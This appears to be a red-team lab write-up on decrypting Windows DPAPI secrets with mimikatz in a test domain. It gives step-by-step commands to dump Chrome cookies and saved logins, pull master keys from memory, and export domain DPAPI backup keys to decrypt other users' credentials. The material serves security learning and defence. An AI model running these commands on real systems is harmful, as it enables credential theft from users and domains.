# Reading DPAPI Encrypted Secrets with Mimikatz

This lab is based on the article posted by harmj0y [https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/). The aim is to get a bit more familiar with DPAPI and explore mimikatz capabilities beyond sekurlsa::logonpasswords.

## Overview

* DPAPI stands for Data Protection API.
* DPAPI is contains 2 functions for encrypting \(`CryptProtectData`\) and decrypting \(`CryptUnprotectData`\) data.
* Created to help developers that know little about cryptography make their programs better at securing users' data.
* Encrypts secrets like wifi passwords, vpn, IE, Chrome, RDP, etc.
* Transparent to end users - programs \(i.e Chrome use the two APIs\) with user's master key which is based on the user's actual logon password.

## Reading Chrome Cookies and Login Data

If you have compromised as system and run under a particular user's context, you can decrypt their DPAPI secrets without knowing their logon password easily with mimikatz.

In this case - let's check user's google chrome cookies:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-04-13-15-31-49.png)

Or any saved credentials:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-04-13-15-34-29.png)

## Protecting and Unprotecting Data

Using mimikatz, we can easily encrypt any data that will only be accessible to currently logged on user \(unless a bad admin comes by - more on this later\):

```csharp
dpapi::protect /data:"spotless"
```

![text &quot;spotless&quot; encrypted into a blob of bytes](../../.gitbook/assets/screenshot-from-2019-04-13-15-42-36.png)

I copy pasted the blob into a new file in HxD and saved it to spotless.bin on my desktop. To decrypt it while running under `mantvydas` user context:

```csharp
dpapi::blob /in:"c:\users\mantvydas\desktop\spotless.bin" /unprotect
```

![](../../.gitbook/assets/screenshot-from-2019-04-13-15-43-02.png)

## Decrypting Other User's Secrets

If you compromised a system and you see that there are other users on the system, you can attempt reading their secrets, but you will not be able to do so since you do not have their DPAPI master key, yet.

Let's try reading user's `spotless` chrome secrets while running as a local admin on the compromised system:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
{% endcode-tabs-item %}
{% endcode-tabs %}

As mentioned, we see an error message suggesting `CryptUnprotectData` is having some issues decrypting the requested secrets:

![](../../.gitbook/assets/screenshot-from-2019-04-13-15-55-38.png)

If you escalated privilges, you can try looking for the master key in memory:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```text
sekurlsa::dpapi
```
{% endcode-tabs-item %}
{% endcode-tabs %}

We see there is the master key for spotless:

![](../../.gitbook/assets/screenshot-from-2019-04-13-16-03-34.png)

Let's now use the master key found earlier to decrypt those chrome secrets:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-04-13-16-05-55.png)

If the user is not logged on, but you have their password, just spawn a process with their creds and repeat the above steps to retrieve their secrets.

### Retrieving MasterKey with User's Password

Same could be achieved if user's SID, their logon password and master key's GUIDs are known:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-04-13-18-02-42.png)

## Extracting DPAPI Backup Keys with Domain Admin

It's possible to extract DPAPI backup keys from the Domain Controller that will enable us to decrypt any user's master key which in turn will allow us to decrypt users' secrets.

While running as a `Domain Admin`, let's dump the DPAPI backup keys:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
lsadump::backupkeys /system:dc01.offense.local /export
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-04-13-16-57-55.png)

Using the retrieved backup key, let's decrypt user's `spotless` master key:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-04-13-17-11-48.png)

We can now decrypt user's `spotless` chrome secrets using their decrypted master key:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-04-13-17-16-47.png)

## References

{% embed url="https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/" %}

{% embed url="https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/" %}





